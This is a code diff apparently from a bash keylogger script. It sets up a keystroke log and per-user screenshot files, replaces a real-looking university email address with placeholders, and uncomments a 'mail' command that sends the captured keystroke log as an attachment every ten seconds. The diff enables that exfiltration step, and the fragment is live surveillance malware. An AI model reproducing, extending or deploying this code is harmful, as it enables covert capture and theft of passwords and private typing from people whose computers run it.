@@ -8,8 +8,8 @@ LOGFILE="$FILEPATH/key_strokes.txt"               # Log file
 SCREENSHOT_FILE="$FILEPATH/screenshot_${current_user}_$(date +'%Y%m%d_%H%M%S').png"
 
 
-TO_EMAIL="cse_182210012101041@lus.ac.bd"          # Recipient
-FROM_EMAIL="cse_182210012101041@lus.ac.bd"                 # Sender
+TO_EMAIL="to@email.com"          # Recipient
+FROM_EMAIL="from@email.com"                 # Sender
 SUBJECT="Key Log of \"$(hostname)\""  # Email subject
 MESSAGE="Key strokes of last 20 seconds"   # Message              
 SEND_INTERVAL=10           # Time in seconds
@@ -122,7 +122,8 @@ while true; do
 
     if [[ -s "$LOGFILE" ]]; then
 
-        #mail -s "$SUBJECT" -A "$LOGFILE" "$TO_EMAIL" <<< $MESSAGE
+        mail -s "$SUBJECT" -A "$LOGFILE" "$TO_EMAIL" <<< $MESSAGE
+		#        Subject       Attachment   To Address    Mail Message
 
         # mail -s "$SUBJECT" \
         #      -A "$LOGFILE" \
